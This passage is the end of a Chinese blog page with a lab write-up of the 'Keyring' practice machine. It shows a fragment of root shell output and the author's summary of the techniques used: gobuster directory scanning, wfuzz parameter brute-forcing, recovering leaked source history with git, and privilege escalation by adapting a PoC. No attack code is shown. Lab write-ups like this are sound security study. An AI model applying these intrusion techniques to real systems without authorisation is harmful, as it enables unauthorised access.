class="number">108</span>(lxd),<span class="number">113</span>(lpadmin),<span class="number">114</span>(sambashare),<span class="number">1000</span>(john)</span><br><span class="line">root<span class="variable">@keyring</span><span class="symbol">:~</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>了解了这里–是告诉touch后面不是参数，不用识别因为文件中带–</p>
<p>总结：这个靶机我卡了好久，也算学了不少东西，以后都用gobuster扫目录，学了wfuzz爆破参数，源码泄漏使用git log和git diff找出历史版本的不同。最后提权稍微修改下poc就可以了</p>
<p>群主复盘视频地址：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV17iP6eLEP2/?spm_id_from=333.1387.upload.video_card.click&vd_source=2971771be3c690f4dabe696dc01299f2">https://www.bilibili.com/video/BV17iP6eLEP2/?spm_id_from=333.1387.upload.video_card.click&amp;vd_source=2971771be3c690f4dabe696dc01299f2</a></p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>guayu-kakeru
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://guayu-kakeru.github.io/posts/8393.html" title="IA: Keyring">https://guayu-kakeru.github.io/posts/8393.html</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/posts/7142.html" rel="prev" title="HMV-buster">
      <i class="fa fa-chevron-left"></i> HMV-buster
    </a></div>
      <div class="post-nav-item">
    <a href="/posts/20816.html" rel="next" title="HMV-hero">
      HMV-hero <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="nav-text">web探测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">76</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



  <div class="links-of-recent-posts motion-element">
    <div class="links-of-recent-posts-title">
      <i class="fa fa-history fa-fw"></i>
      最近文章
    </div>
    <ul class="links-of-recent-posts-list">
        <li class="links-of-recent-posts-item">
          <a href="/posts/14848.html" title="posts&#x2F;14848.html">群友靶机-Kakeru2 wp</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/19220.html" title="posts&#x2F;19220.html">xmu新生赛web wp</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/51954.html" title="posts&#x2F;51954.html">群友靶机-LingMj复盘</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/28847.html" title="posts&#x2F;28847.html">群友靶机-Noport复盘</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/posts/7589.html" title="posts&#x2F;7589.html">SQL注入专题(更新中)</a>
        </li>
    </ul>
  </div>
      </div>

      
      
        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
          <div class="links-of-blogroll-title">
            <i class="fa fa-history fa-" aria-hidden="true"></i>
            
          </div>
          <ul class="links-of-blogroll-list">
            
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
              <li class="recent_posts_li">
                <a href="/" title="" target="_blank"></a>
              </li>
            
          </ul>
        </div>
      
    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
</div>



        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
